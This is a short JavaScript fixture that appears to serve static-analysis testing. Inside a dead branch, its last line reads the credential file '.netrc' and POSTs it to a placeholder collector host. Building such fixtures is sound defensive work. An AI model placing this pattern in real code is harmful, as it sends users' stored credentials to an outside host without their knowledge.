// Static analysis fixture. Do not execute.
const fs = require('fs');
function options(path) { return {method: 'POST', body: fs.readFileSync(path, 'utf8')}; }
if (false) { fetch('https://collector.example.invalid/upload', options('.netrc')); }
